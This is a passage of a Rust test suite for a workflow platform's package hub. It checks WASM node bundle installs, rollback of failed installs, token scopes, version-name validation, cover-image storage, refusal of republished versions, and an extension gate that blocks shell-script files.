            "apiVersion": "zebflow.com/v1",
            "kind": "NodeBundle",
            "metadata": { "name": "e2ewasm", "version": "1.0.0" },
            "spec": {
                "package": "e2ewasm",
                "version": "1.0.0",
                "title": "E2E WASM Bundle",
                "description": "Two WASM nodes sharing one module through distinct exports.",
                "icon": "icon.svg",
                "credentials": [],
                "functions": {},
                "modules": {
                    "core": { "path": "wasm/core.wasm", "abi": "zebflow-wasm-json-v1" }
                },
                "nodes": [
                    wasm_node_entry("n.x.e2ewasm.train", "E2E Train", "e2e_train"),
                    wasm_node_entry("n.x.e2ewasm.score", "E2E Score", "e2e_score")
                ]
            }
        })
        .to_string();
        let icon = "<svg xmlns=\"http://www.w3.org/2000/svg\"/>";

        let payload: HubPackageSpec = serde_json::from_value(serde_json::json!({
            "asset_kind": "node_bundle",
            "title": "E2E WASM",
            "description": "Exercises per-node WASM export resolution.",
            "files": [
                {
                    "rel_path": "definition.json",
                    "kind": "node_definition",
                    "size_bytes": definition.len(),
                    "reason": "test",
                    "content": definition
                },
                {
                    "rel_path": "icon.svg",
                    "kind": "asset",
                    "size_bytes": icon.len(),
                    "reason": "test",
                    "content": icon
                },
                {
                    "rel_path": "wasm/core.wasm",
                    "kind": "asset",
                    "size_bytes": module.len(),
                    "reason": "test",
                    "encoding": "base64",
                    "content": base64::engine::general_purpose::STANDARD.encode(module)
                }
            ]
        }))
        .unwrap();

        platform
            .hub
            .install_artifact_payload_from(
                owner.to_string(),
                project.to_string(),
                "e2ewasm",
                "1.0.0",
                "",
                "test/e2ewasm",
                payload,
                &no_channel(),
            )
            .expect("install succeeds");

        // Each node resolves its own export from the shared module.
        for (kind, export) in [
            ("n.x.e2ewasm.train", "e2e_train"),
            ("n.x.e2ewasm.score", "e2e_score"),
        ] {
            let installed = platform
                .node_registry
                .get_by_kind(owner, project, kind)
                .unwrap_or_else(|| panic!("{kind} is installed"));
            assert_eq!(
                installed.manifest.source,
                crate::platform::model::NodePackageSource::Wasm
            );
            let (module_spec, resolved) = installed.manifest.wasm_target().expect("wasm target");
            assert_eq!(module_spec.path, "wasm/core.wasm");
            assert_eq!(resolved, export);

            let output = crate::pipeline::engines::wasm_host::execute_wasm_node(
                kind.to_string(),
                serde_json::json!({}),
                platform.clone(),
                crate::pipeline::nodes::NodeExecutionInput {
                    node_id: "n1".to_string(),
                    input_pin: "in".to_string(),
                    payload: serde_json::json!({ "value": 2 }),
                    metadata: serde_json::json!({ "owner": owner, "project": project }),
                    bus: None,
                },
            )
            .await
            .unwrap_or_else(|err| panic!("{kind} executes: {}", err.message));

            assert_eq!(output.len(), 1);
            assert_eq!(output[0].payload["ok"], serde_json::json!(true));
            assert_eq!(output[0].payload["engine"], serde_json::json!("wasm"));
            assert_eq!(
                output[0].payload["contract"],
                serde_json::json!("zebflow-wasm-json-v1")
            );
            assert_eq!(
                output[0].payload["export"],
                serde_json::json!(export),
                "each node must run its own export, not a shared default"
            );
        }
    }

    #[test]
    fn failed_node_bundle_install_restores_files_and_dependency_lock() {
        let root = tempfile::tempdir().unwrap();
        let platform = crate::platform::services::PlatformService::from_config(
            crate::platform::model::PlatformConfig {
                data_root: root.path().to_path_buf(),
                default_password: "test-password".to_string(),
                ..Default::default()
            },
        )
        .unwrap();
        let owner = "superadmin";
        let project = "default";
        let before = platform.dependency_lock.read(owner, project).unwrap();
        let payload: HubPackageSpec = serde_json::from_value(serde_json::json!({
            "asset_kind": "node_bundle",
            "title": "Broken node bundle",
            "description": "Exercises transactional recovery.",
            "files": [
                {
                    "rel_path": "README.md",
                    "kind": "documentation",
                    "size_bytes": 7,
                    "reason": "test",
                    "content": "written"
                },
                {
                    "rel_path": "definition.json",
                    "kind": "node_definition",
                    "size_bytes": 2,
                    "reason": "test",
                    "content": "{}"
                }
            ]
        }))
        .unwrap();

        let error = platform
            .hub
            .install_artifact_payload_from(
                owner.to_string(),
                project.to_string(),
                "broken-bundle",
                "1.0.0",
                "",
                "test/broken-bundle",
                payload,
                &no_channel(),
            )
            .unwrap_err();
        assert_eq!(error.code, "NODE_MANIFEST_PARSE");
        let package_dir = root
            .path()
            .join("users/superadmin/default/data/nodes/broken-bundle");
        assert!(!package_dir.join("README.md").exists());
        assert!(!package_dir.join("definition.json").exists());
        assert_eq!(
            platform.dependency_lock.read(owner, project).unwrap(),
            before
        );
    }

    #[test]
    fn successful_node_bundle_install_registers_and_locks_the_exact_bundle() {
        let root = tempfile::tempdir().unwrap();
        let platform = crate::platform::services::PlatformService::from_config(
            crate::platform::model::PlatformConfig {
                data_root: root.path().to_path_buf(),
                default_password: "test-password".to_string(),
                ..Default::default()
            },
        )
        .unwrap();
        let owner = "superadmin";
        let project = "default";
        // Rename the whole package identity: a kind is owned by its package, so
        // the slug, metadata name, and kind namespace must move together.
        let definition =
            include_str!("../../pipeline/nodes/bundled/openai-embedding/definition.json")
                .replace("n.ai.embedding", "n.x.openai_embedding_test.embed")
                .replace("\"openai-embedding\"", "\"openai-embedding-test\"");
        let function =
            include_str!("../../pipeline/nodes/bundled/openai-embedding/functions/embed.zf.json");
        // The bundle declares an icon, so the install must ship it. A declared
        // artifact that never lands now fails the registry refresh.
        let icon = include_str!("../../pipeline/nodes/bundled/openai-embedding/icon.svg");
        let node_icon =
            include_str!("../../pipeline/nodes/bundled/openai-embedding/icons/embedding.svg");
        let payload: HubPackageSpec = serde_json::from_value(serde_json::json!({
            "asset_kind": "node_bundle",
            "title": "OpenAI embedding",
            "description": "Exercises successful dependency installation.",
            "files": [
                {
                    "rel_path": "definition.json",
                    "kind": "node_definition",
                    "size_bytes": definition.len(),
                    "reason": "test",
                    "content": definition
                },
                {
                    "rel_path": "functions/embed.zf.json",
                    "kind": "pipeline",
                    "size_bytes": function.len(),
                    "reason": "test",
                    "content": function
                },
                {
                    "rel_path": "icon.svg",
                    "kind": "asset",
                    "size_bytes": icon.len(),
                    "reason": "test",
                    "content": icon
                },
                {
                    "rel_path": "icons/embedding.svg",
                    "kind": "asset",
                    "size_bytes": node_icon.len(),
                    "reason": "test",
                    "content": node_icon
                }
            ]
        }))
        .unwrap();

        let result = platform
            .hub
            .install_artifact_payload_from(
                owner.to_string(),
                project.to_string(),
                "openai-embedding-test",
                "1.0.0",
                "",
                "test/openai-embedding-test",
                payload,
                &no_channel(),
            )
            .unwrap();
        assert_eq!(result.install_root, "nodes/openai-embedding-test");
        assert!(
            platform
                .node_registry
                .merged_definitions(owner, project)
                .iter()
                .any(|definition| definition.kind == "n.x.openai_embedding_test.embed")
        );
        let lock = platform.dependency_lock.read(owner, project).unwrap();
        let bundle = lock
            .nodes
            .bundles
            .values()
            .find(|bundle| bundle.definitions == ["n.x.openai_embedding_test.embed"])
            .unwrap();
        assert_eq!(
            bundle.source,
            crate::contracts::kinds::DependencyLockSource::Hub
        );
        assert_eq!(bundle.source_id, "test/openai-embedding-test");
        assert_eq!(bundle.entry, "nodes/openai-embedding-test/definition.json");
    }

    #[test]
    fn normalize_scopes_accepts_known_hub_scopes_in_any_shape() {
        let scopes = normalize_scopes(&[
            "hub:publish".to_string(),
            " HUB:read ".to_string(),
            "hub:publish".to_string(),
        ])
        .expect("known scopes");
        assert_eq!(
            scopes,
            vec!["hub:publish".to_string(), "hub:read".to_string()]
        );
    }

    /// An unrecognised scope used to be dropped, so a token asked for
    /// `["read","publish"]` was created holding nothing and only failed later,
    /// at a different endpoint, as `HUB_TOKEN_FORBIDDEN / scope missing`.
    #[test]
    fn normalize_scopes_refuses_an_unknown_scope_by_name() {
        let error = normalize_scopes(&["read".to_string(), "hub:publish".to_string()])
            .expect_err("an unusable scope is refused");
        assert_eq!(error.code, "HUB_TOKEN_SCOPE_INVALID");
        assert!(
            error.message.contains("'read'") && error.message.contains("hub:read"),
            "the refusal names the value and the accepted set, got {}",
            error.message
        );
    }

    #[test]
    fn normalize_scopes_refuses_a_token_with_no_usable_scope() {
        let error = normalize_scopes(&[]).expect_err("a token that can do nothing is refused");
        assert_eq!(error.code, "HUB_TOKEN_SCOPE_INVALID");
    }

    #[test]
    fn apply_scope_flags_sets_explicit_permissions() {
        let token = apply_scope_flags(HubToken {
            token_id: "mkt_1".to_string(),
            authority_id: "mka_1".to_string(),
            publisher_pk: "mpub_1".to_string(),
            owner: "superadmin".to_string(),
            project: "default".to_string(),
            publisher_id: "zebflow-official".to_string(),
            publisher_display_name: "Zebflow Official".to_string(),
            publisher_url: "/publishers/zebflow-official".to_string(),
            publisher_email: "publishers@zebflow.com".to_string(),
            title: "Official".to_string(),
            secret_hash: "hash".to_string(),
            scopes: vec!["hub:read".to_string(), "hub:publish".to_string()],
            scope_read: false,
            scope_publish: false,
            scope_manage: false,
            expires_at: None,
            last_used_at: None,
            revoked_at: None,
            created_at: 0,
            updated_at: 0,
        });
        assert!(token.scope_read);
        assert!(token.scope_publish);
        assert!(!token.scope_manage);
        assert!(token.grants_scope("hub:read"));
        assert!(token.grants_scope("hub:publish"));
        assert!(!token.grants_scope("hub:manage"));
    }

    #[test]
    fn publisher_scopes_respect_current_permissions() {
        let publisher = HubPublisher {
            authority_id: DEFAULT_HUB_SERVICE_INSTANCE_ID.to_string(),
            publisher_pk: "mpub_1".to_string(),
            owner: HUB_SERVICE_SCOPE_OWNER.to_string(),
            project: HUB_SERVICE_SCOPE_PROJECT.to_string(),
            publisher_id: "zebflow-official".to_string(),
            display_name: "Zebflow Official".to_string(),
            publisher_url: "/publishers/zebflow-official".to_string(),
            email: "publishers@zebflow.com".to_string(),
            description: String::new(),
            icon_url: String::new(),
            website_url: String::new(),
            enabled: true,
            can_read: true,
            can_publish: false,
            can_manage: false,
            max_packages: 20,
            max_package_bytes: 10 * 1024 * 1024,
            max_media_files: 8,
            max_image_bytes: 2 * 1024 * 1024,
            created_at: 0,
            updated_at: 0,
        };
        assert!(validate_publisher_scopes(&publisher, &["hub:read".to_string()]).is_ok());
        let err = validate_publisher_scopes(&publisher, &["hub:publish".to_string()])
            .expect_err("publish scope should be denied");
        assert_eq!(err.code, "HUB_PUBLISHER_SCOPE_DENIED");
    }

    #[test]
    fn hub_versions_are_single_safe_path_segments() {
        assert!(validate_hub_version("1.0.0").is_ok());
        assert!(validate_hub_version("1.0.0-beta_1").is_ok());
        assert!(validate_hub_version("../secret").is_err());
        assert!(validate_hub_version("1/2").is_err());
        assert!(validate_hub_version("release candidate").is_err());
    }

    #[test]
    fn ownerless_hub_api_base_builds_hub_routes() {
        let repo = PlatformHubRepository {
            source_id: "pmr_1".to_string(),
            owner_user_id: "user_1".to_string(),
            owner: "superadmin".to_string(),
            repository_id: "zebflow-hub".to_string(),
            title: "Zebflow Hub".to_string(),
            base_url: "https://hub.zebflow.com/api".to_string(),
            remote_owner: String::new(),
            remote_project: String::new(),
            read_token: String::new(),
            visibility: "public".to_string(),
            enabled: true,
            created_at: 0,
            updated_at: 0,
        };

        assert_eq!(
            remote_hub_url_for_platform(&repo, "remote/assets"),
            "https://hub.zebflow.com/api/hub/remote/assets"
        );
    }

    /// Builds a platform with the hub service enabled, one publisher that may
    /// publish, and one pipeline to publish from.
    fn hub_publish_fixture(
        label: &str,
    ) -> (
        tempfile::TempDir,
        std::sync::Arc<crate::platform::services::PlatformService>,
    ) {
        let root = tempfile::tempdir().unwrap();
        let platform = std::sync::Arc::new(
            crate::platform::services::PlatformService::from_config(
                crate::platform::model::PlatformConfig {
                    data_root: root.path().to_path_buf(),
                    default_password: "test-password".to_string(),
                    ..Default::default()
                },
            )
            .unwrap(),
        );
        platform
            .hub
            .ensure_default_service_instance("standalone", "http://127.0.0.1/api", true)
            .expect("hub service enabled");
        platform
            .hub
            .set_authority_enabled("superadmin", "default", true)
            .expect("authority enabled");
        platform
            .hub
            .upsert_publisher(
                "superadmin",
                "default",
                "calc-studio",
                "Calc Studio",
                "https://publishers.example/calc-studio",
                "publishers@example.com",
                "",
                "",
                "",
                true,
                true,
                true,
                true,
                20,
                10 * 1024 * 1024,
                8,
                2 * 1024 * 1024,
            )
            .expect("publisher");
        write_publish_source(&platform, label);
        (root, platform)
    }

    /// Writes the pipeline that the fixture publishes. Called again with a
    /// different label to change the source, and so the artifact digest.
    fn write_publish_source(platform: &crate::platform::services::PlatformService, label: &str) {
        platform
            .projects
            .upsert_pipeline_definition(
                "superadmin",
                "default",
                "pipelines/calc.zf.json",
                label,
                label,
                "manual",
                &serde_json::json!({
                    "apiVersion": "zebflow.com/v1",
                    "kind": "Pipeline",
                    "metadata": {"name": "calc"},
                    "spec": {
                        "id": "calc",
                        "description": label,
                        "entry_nodes": [],
                        "nodes": [],
                        "edges": []
                    }
                })
                .to_string(),
            )
            .expect("pipeline");
    }

    fn publish_calc_tools(
        platform: &crate::platform::services::PlatformService,
        version: &str,
    ) -> Result<(HubAssetPackage, HubAssetVersion), PlatformError> {
        platform.hub.publish_asset(
            "superadmin",
            "default",
            "superadmin",
            "calc-studio",
            "",
            "",
            "",
            "superadmin",
            "default",
            "pipeline_with_dependencies",
            "pipelines/calc.zf.json",
            "calc-tools",
            version,
            "Calculator Tools",
            "Reusable calculator pipeline.",
            "",
            "public",
            Default::default(),
            vec!["math".to_string()],
        )
    }

    /// Publishes with a cover image supplied the way the publish API supplies
    /// one: a path into the project's own file store.
    fn publish_calc_tools_with_cover(
        platform: &crate::platform::services::PlatformService,
        version: &str,
        image_file_path: &str,
    ) -> Result<(HubAssetPackage, HubAssetVersion), PlatformError> {
        platform.hub.publish_asset(
            "superadmin",
            "default",
            "superadmin",
            "calc-studio",
            "",
            "",
            "",
            "superadmin",
            "default",
            "pipeline_with_dependencies",
            "pipelines/calc.zf.json",
            "calc-tools",
            version,
            "Calculator Tools",
            "Reusable calculator pipeline.",
            image_file_path,
            "public",
            Default::default(),
            vec!["math".to_string()],
        )
    }

    /// Writes a PNG into the project's file store and returns its path.
    fn write_cover_source(root: &tempfile::TempDir, width: u32, height: u32) -> String {
        let dir = root
            .path()
            .join("users")
            .join("superadmin")
            .join("default")
            .join("files")
            .join("images");
        std::fs::create_dir_all(&dir).expect("image dir");
        let mut png = Vec::new();
        image::DynamicImage::ImageRgba8(image::ImageBuffer::from_fn(width, height, |x, y| {
            image::Rgba([(x % 256) as u8, (y % 256) as u8, 160, 255])
        }))
        .write_to(&mut Cursor::new(&mut png), ImageFormat::Png)
        .expect("png");
        std::fs::write(dir.join("cover.png"), png).expect("write cover");
        "images/cover.png".to_string()
    }

    /// A cover is presentation, so it is stored beside the release rather than
    /// inside it: the release document names no image at all, and the bytes are
    /// reached through the content-addressed artifact store.
    #[test]
    fn a_cover_is_stored_as_an_artifact_and_never_enters_the_release() {
        let (root, platform) = hub_publish_fixture("Calculator One");
        let image_file_path = write_cover_source(&root, 64, 36);

        let (package, version) =
            publish_calc_tools_with_cover(&platform, "1.0.0", &image_file_path)
                .expect("publish with a cover");

        // The release document: no presentation of any kind.
        let release = std::fs::read(root.path().join(&version.artifact_rel_path))
            .expect("release document bytes");
        let spec = decode_hub_package(&release).expect("release decodes").spec;
        let spec_value = serde_json::to_value(&spec).expect("spec value");
        let spec_object = spec_value.as_object().expect("spec object");
        for field in ["media", "gallery", "image_url", "description_md", "summary"] {
            assert!(
                !spec_object.contains_key(field),
                "spec.{field} must not be in the release"
            );
        }
        assert!(
            !String::from_utf8_lossy(&release).contains("RIFF"),
            "no WebP bytes reached the document an installer parses"
        );

        // The mutable side names the bytes by digest.
        let cover = package.media.first().expect("a cover is recorded");
        assert_eq!(cover.name, "cover.webp");
        assert_eq!(cover.role, "cover");
        assert_eq!(cover.content_type, "image/webp");
        assert_eq!(cover.artifact_sha256.len(), 64);
        assert_eq!(
            package.image_url,
            "/api/hub/remote/assets/calc-studio.calc-tools/media/cover.webp"
        );
        assert_eq!(
            package
                .gallery
                .cover
                .as_ref()
                .map(|item| item.media_name.as_str()),
            Some("cover.webp")
        );

        // Those bytes are in the shared artifact store, under their digest.
        let stored = root
            .path()
            .join("services")
            .join(DEFAULT_HUB_SERVICE_INSTANCE_ID)
            .join("artifacts")
            .join(&cover.artifact_sha256);
        assert!(stored.is_file(), "the cover is stored content-addressed");
        let stored_bytes = std::fs::read(&stored).expect("stored cover bytes");
        assert_eq!(sha256_hex(&stored_bytes), cover.artifact_sha256);
        assert_eq!(stored_bytes.len(), cover.size_bytes);

        // Serving the cover resolves it from the store, not from a release.
        let (served_package, served_media, served_bytes) = platform
            .hub
            .get_latest_asset_media("calc-studio.calc-tools", "cover.webp")
            .expect("cover resolves");
        assert_eq!(served_package.package_id, "calc-studio.calc-tools");
        assert_eq!(served_media.artifact_sha256, cover.artifact_sha256);
        assert_eq!(served_bytes, stored_bytes);

        // A second release of the same package does not re-store the cover: the
        // store is content-addressed, so one image costs one file.
        publish_calc_tools_with_cover(&platform, "1.0.1", &image_file_path)
            .expect("second version publishes");
        let artifact_files = std::fs::read_dir(
            root.path()
                .join("services")
                .join(DEFAULT_HUB_SERVICE_INSTANCE_ID)
                .join("artifacts"),
        )
        .expect("artifact dir")
        .count();
        assert_eq!(artifact_files, 1, "identical bytes are stored once");
    }

    /// The quota is checked against the converted WebP, before anything is
    /// stored, so an oversized cover cannot leave a file behind.
    #[test]
    fn an_oversized_cover_is_refused_before_it_is_stored() {
        let (root, platform) = hub_publish_fixture("Calculator One");
        platform
            .hub
            .upsert_publisher(
                "superadmin",
                "default",
                "calc-studio",
                "Calc Studio",
                "https://publishers.example/calc-studio",
                "publishers@example.com",
                "",
                "",
                "",
                true,
                true,
                true,
                true,
                20,
                10 * 1024 * 1024,
                8,
                // One byte of headroom: any real cover exceeds it.
                1,
            )
            .expect("publisher with a tiny image quota");
        let image_file_path = write_cover_source(&root, 512, 288);

        let error = publish_calc_tools_with_cover(&platform, "1.0.0", &image_file_path)
            .expect_err("the cover is refused");

        assert_eq!(error.code, "HUB_PUBLISHER_QUOTA_EXCEEDED");
        assert!(
            !root
                .path()
                .join("services")
                .join(DEFAULT_HUB_SERVICE_INSTANCE_ID)
                .join("artifacts")
                .exists(),
            "nothing is stored for a refused cover"
        );
    }

    #[test]
    fn publishing_a_new_package_version_records_the_release_and_its_artifact() {
        let (root, platform) = hub_publish_fixture("Calculator One");

        let (package, version) = publish_calc_tools(&platform, "1.0.0").expect("first publish");

        assert_eq!(package.package_id, "calc-studio.calc-tools");
        assert_eq!(version.version, "1.0.0");
        let stored = platform
            .hub
            .hub_data
            .get_hub_asset_version("calc-studio.calc-tools", "1.0.0")
            .expect("version lookup")
            .expect("version row is stored");
        assert_eq!(stored.artifact_sha256, version.artifact_sha256);
        let artifact = root.path().join(&version.artifact_rel_path);
        assert!(artifact.exists(), "the artifact file is written");
        assert_eq!(
            sha256_hex(&std::fs::read(&artifact).expect("artifact bytes")),
            version.artifact_sha256,
            "the recorded digest names the stored bytes"
        );
        // A different version of the same package is a new release, not a
        // republish, and stays allowed.
        publish_calc_tools(&platform, "1.0.1").expect("second version publishes");
    }

    #[test]
    fn republishing_a_package_version_is_refused_and_leaves_the_release_untouched() {
        let (root, platform) = hub_publish_fixture("Calculator One");
        let (_, first) = publish_calc_tools(&platform, "1.0.0").expect("first publish");
        let artifact = root.path().join(&first.artifact_rel_path);
        let bytes_before = std::fs::read(&artifact).expect("artifact bytes");

        // Change the source so a republish that slipped through would produce
        // different bytes and a different digest — exactly the drift that turns
        // a `zeb.lock` pin into a false tampered-dependency report.
        write_publish_source(&platform, "Calculator Two");
        let error = publish_calc_tools(&platform, "1.0.0").expect_err("republish is refused");

        assert_eq!(error.code, "HUB_VERSION_EXISTS");
        assert!(
            error.message.contains("calc-studio.calc-tools@1.0.0"),
            "the message names the release: {}",
            error.message
        );
        assert!(
            error.message.contains("bump the version"),
            "the message tells the publisher what to do instead: {}",
            error.message
        );

        let stored = platform
            .hub
            .hub_data
            .get_hub_asset_version("calc-studio.calc-tools", "1.0.0")
            .expect("version lookup")
            .expect("the original row survives");
        assert_eq!(stored.artifact_sha256, first.artifact_sha256);
        assert_eq!(stored.artifact_rel_path, first.artifact_rel_path);
        assert_eq!(stored.manifest, first.manifest);
        assert_eq!(
            stored.created_at, first.created_at,
            "a refused republish does not rewrite when the release was created"
        );
        assert_eq!(
            std::fs::read(&artifact).expect("artifact bytes"),
            bytes_before,
            "the stored artifact keeps the bytes the digest names"
        );
        assert_eq!(
            platform
                .hub
                .list_asset_versions("calc-studio.calc-tools")
                .expect("versions")
                .len(),
            1,
            "the refusal writes no second row"
        );
    }

    /// Writes one file into the fixture project's repository.
    ///
    /// A folder publish exports whatever the walk finds, so this is how a
    /// source acquires a file the project's own APIs would never write.
    fn write_repo_file(root: &tempfile::TempDir, rel: &str, content: &str) {
        let path = root
            .path()
            .join("users")
            .join("superadmin")
            .join("default")
            .join("repo")
            .join(rel);
        std::fs::create_dir_all(path.parent().expect("parent")).expect("repo dir");
        std::fs::write(&path, content).expect("write repo file");
    }

    fn publish_folder(
        platform: &crate::platform::services::PlatformService,
        package_id: &str,
        source_ref: &str,
        image_file_path: &str,
    ) -> Result<(HubAssetPackage, HubAssetVersion), PlatformError> {
        platform.hub.publish_asset(
            "superadmin",
            "default",
            "superadmin",
            "calc-studio",
            "",
            "",
            "",
            "superadmin",
            "default",
            "folder_files",
            source_ref,
            package_id,
            "1.0.0",
            "Folder Pack",
            "A folder published as it stands.",
            image_file_path,
            "public",
            Default::default(),
            vec![],
        )
    }

    /// Publish refuses what install refuses, and says which file.
    ///
    /// A release carrying a violation is refused by every install gate, so
    /// storing it would spend a version number -- permanently, because the
    /// coordinate cannot be republished -- on bytes nobody can use.
    ///
    /// The cover is supplied deliberately: it is the first durable write in
    /// `publish_asset`, so an empty artifact store is what proves the refusal
    /// comes before the writing rather than beside it.
    #[test]
    fn a_publish_carrying_a_file_type_no_project_accepts_is_refused() {
        let (root, platform) = hub_publish_fixture("Calculator One");
        write_repo_file(&root, "pipelines/folder-pack/postinstall.sh", "true\n");
        let image_file_path = write_cover_source(&root, 64, 36);

        let error = publish_folder(
            &platform,
            "folder-pack",
            "pipelines/folder-pack",
            &image_file_path,
        )
        .expect_err("a package no instance can install must not be stored");

        assert_eq!(error.code, "HUB_PUBLISH_REFUSED");
        assert!(
            error
                .message
                .contains("pipelines/folder-pack/postinstall.sh")
                && error.message.contains("'.sh'"),
            "the publisher is told the path and the extension: {}",
            error.message
        );
        assert!(
            platform
                .hub
                .hub_data
                .get_hub_asset_version("calc-studio.folder-pack", "1.0.0")
                .expect("version lookup")
                .is_none(),
            "a refused publish records no version row"
        );
        assert!(
            platform
                .hub
                .hub_data
                .get_hub_asset_package("calc-studio.folder-pack")
                .expect("package lookup")
                .is_none(),
            "a refused publish records no package row"
        );
        assert!(
            !root
                .path()
                .join("services/hub-default/packages/calc-studio.folder-pack")
                .exists(),
            "a refused publish creates no release directory"
        );
        assert!(
            !root.path().join("services/hub-default/artifacts").exists(),
            "a refused publish stores no cover either"
        );
    }

    /// The same folder with the same file renamed: a legitimate package still
    /// publishes, so the gate is the extension and not the folder.
    #[test]
    fn an_ordinary_folder_still_publishes() {
        let (root, platform) = hub_publish_fixture("Calculator One");
        write_repo_file(&root, "pipelines/folder-pack/postinstall.tsx", "true\n");

        let (_, version) = publish_folder(&platform, "folder-pack", "pipelines/folder-pack", "")
            .expect("ordinary source publishes");

        assert!(
            root.path().join(&version.artifact_rel_path).exists(),
            "the release is written where the row says it is"
        );
    }

    /// The extension set is the *receiver's*: a release records none, and a
    /// project may narrow its own. Reviewing a publish against the publisher's
    /// narrowed set would refuse a release every receiver would install, and a
    /// violation has no override, so the publish review reads the platform
    /// floor instead.
    #[test]
    fn a_publish_is_reviewed_against_the_platform_extension_floor() {
        let mut narrowed = ResolvedProjectLayout::platform_default();
        narrowed.source = "src".to_string();
        narrowed.allowed_extensions = vec!["tsx".to_string()];
        let files = pipeline_package(
            HUB_ASSET_KIND_FOLDER_BUNDLE,
            serde_json::json!({
                "rel_path": "src/pack/settings.json", "kind": "json",
                "size_bytes": 3, "reason": "test", "content": "{}\n"
            }),
        )
        .files;
        let review_against = |layout: &ResolvedProjectLayout| {
            review_publish_entries(
                layout,
                HUB_ASSET_KIND_FOLDER_BUNDLE,
                &files,
                Vec::new(),
                "Pack",
                "A pack.",
                true,
                &no_channel(),
            )
        };

        assert!(
            !review_against(&narrowed).is_installable(),
            "the control: the narrowed set does refuse a .json file"
        );

        let reviewed = publish_review_layout(&narrowed);
        assert_eq!(
            reviewed.source, "src",
            "the publisher's own directories are what decide its pipelines"
        );
        assert!(
            review_against(&reviewed).is_installable(),
            "a publish is not refused for a file type every receiver accepts"
        );
    }

    /// The remote publish route is a publish, so it refuses what a publish
    /// refuses. The coordinate would be burned on *this* hub, where the
    /// publisher cannot retract it, and every installer fetching from here
    /// would refuse what they were served.
    #[test]
    fn remote_publishing_a_file_type_no_project_accepts_is_refused() {
        let (root, platform) = hub_publish_fixture("Calculator One");
        let token = remote_publish_token(&platform);

        let error = platform
            .hub
            .import_remote_asset(
                "superadmin",
                "default",
                &token,
                &remote_publish_request(
                    "1.0.0",
                    serde_json::json!({
                        "rel_path": "pipelines/pack/postinstall.sh",
                        "kind": "file",
                        "size_bytes": 5,
                        "reason": "package",
                        "content": "true\n"
                    }),
                ),
            )
            .expect_err("an inbound package no instance can install must not be stored");

        assert_eq!(error.code, "HUB_REMOTE_PUBLISH_REFUSED");
        assert!(
            error.message.contains("pipelines/pack/postinstall.sh")
                && error.message.contains("'.sh'"),
            "the sending publisher is told the path and the extension: {}",
            error.message
        );
        assert!(
            platform
                .hub
                .hub_data
                .get_hub_asset_version("calc-studio.remote-pack", "1.0.0")
                .expect("version lookup")
                .is_none(),
            "a refused remote publish records no version row"
        );
        assert!(
            !root
                .path()
                .join("services/hub-default/packages/calc-studio.remote-pack")
                .exists(),
            "a refused remote publish creates no release directory"
        );
    }

    /// The gate is the violation and not the route: an inbound package with
    /// nothing to refuse still lands.
    #[test]
    fn an_ordinary_remote_publish_still_lands() {
        let (root, platform) = hub_publish_fixture("Calculator One");
        let token = remote_publish_token(&platform);

        let (_, version) = platform
            .hub
            .import_remote_asset(
                "superadmin",
                "default",
                &token,
                &remote_publish_request(
                    "1.0.0",
                    serde_json::json!({
                        "rel_path": "pipelines/pack/postinstall.tsx",
                        "kind": "tsx",
                        "size_bytes": 5,
                        "reason": "package",
                        "content": "true\n"
                    }),
                ),
            )
            .expect("an ordinary inbound package is stored");

        assert!(
            root.path().join(&version.artifact_rel_path).exists(),
            "the release is written where the row says it is"
        );
    }

    fn remote_publish_token(
        platform: &crate::platform::services::PlatformService,
    ) -> crate::platform::model::HubToken {
        platform
            .hub
            .create_token(
                "superadmin",
                "default",
                &crate::platform::model::CreateHubTokenRequest {
                    publisher_id: "calc-studio".to_string(),
                    title: "Publish token".to_string(),
                    scopes: vec!["hub:publish".to_string()],
                    expires_at: None,
                },
            )
            .expect("publisher token")
            .0
    }

    /// One inbound release whose single entry is supplied by the caller.
    fn remote_publish_request(version: &str, entry: serde_json::Value) -> RemoteHubPublishRequest {
        RemoteHubPublishRequest {
            package_id: "remote-pack".to_string(),
            version: version.to_string(),
            title: "Remote Pack".to_string(),
            description: "Published from another instance.".to_string(),
            summary: String::new(),
            description_md: String::new(),
            media: Vec::new(),
            gallery: HubAssetGallery::default(),
            visibility: "public".to_string(),
            tags: Vec::new(),
            source_owner: "superadmin".to_string(),
            source_project: "default".to_string(),
            source_kind: "folder_files".to_string(),
            source_ref: "pipelines/pack".to_string(),
            artifact: serde_json::json!({
                "apiVersion": "zebflow.com/v1",
                "kind": "HubPackage",
                "metadata": {"name": "calc-studio.remote-pack", "version": version},
                "spec": {
                    "asset_kind": "folder_bundle",
                    "title": "Remote Pack",
                    "description": "Published from another instance.",
                    "files": [entry]
                }
            }),
        }
    }

    #[test]
    fn remote_publishing_an_existing_package_version_is_refused() {
        let (root, platform) = hub_publish_fixture("Calculator One");
        let (_, first) = publish_calc_tools(&platform, "1.0.0").expect("first publish");
        let artifact = root.path().join(&first.artifact_rel_path);
        let bytes_before = std::fs::read(&artifact).expect("artifact bytes");
        let (token, _secret) = platform
            .hub
            .create_token(
                "superadmin",
                "default",
                &crate::platform::model::CreateHubTokenRequest {
                    publisher_id: "calc-studio".to_string(),
                    title: "Publish token".to_string(),
                    scopes: vec!["hub:publish".to_string()],
                    expires_at: None,
                },
            )
            .expect("publisher token");

        let error = platform
            .hub
            .import_remote_asset(
                "superadmin",
                "default",
                &token,
                &RemoteHubPublishRequest {
                    package_id: "calc-tools".to_string(),
                    version: "1.0.0".to_string(),
                    title: "Remote overwrite".to_string(),
                    description: "Should never land.".to_string(),
                    summary: String::new(),
                    description_md: String::new(),
                    media: Vec::new(),
                    gallery: HubAssetGallery::default(),
                    visibility: "public".to_string(),
                    tags: Vec::new(),
                    source_owner: "superadmin".to_string(),
                    source_project: "default".to_string(),
                    source_kind: "pipeline_with_dependencies".to_string(),
                    source_ref: "pipelines/calc.zf.json".to_string(),
                    artifact: serde_json::json!({
                        "apiVersion": "zebflow.com/v1",
                        "kind": "HubPackage",
                        "metadata": {"name": "calc-studio.calc-tools", "version": "1.0.0"},
                        "spec": {
                            "asset_kind": "pipeline_bundle",
                            "title": "Remote overwrite",
                            "description": "Should never land.",
                            "files": [
                                {
                                    "rel_path": "pipelines/calc.zf.json",
                                    "kind": "pipeline",
                                    "size_bytes": 2,
                                    "reason": "package",
                                    "content": "{}"
                                }
                            ]
                        }
                    }),
                },
            )
            .expect_err("remote republish is refused");

        assert_eq!(error.code, "HUB_VERSION_EXISTS");
        let stored = platform
            .hub
            .hub_data
            .get_hub_asset_version("calc-studio.calc-tools", "1.0.0")
            .expect("version lookup")
            .expect("the original row survives");
        assert_eq!(stored.artifact_sha256, first.artifact_sha256);
        assert_eq!(stored.created_at, first.created_at);
        assert_eq!(
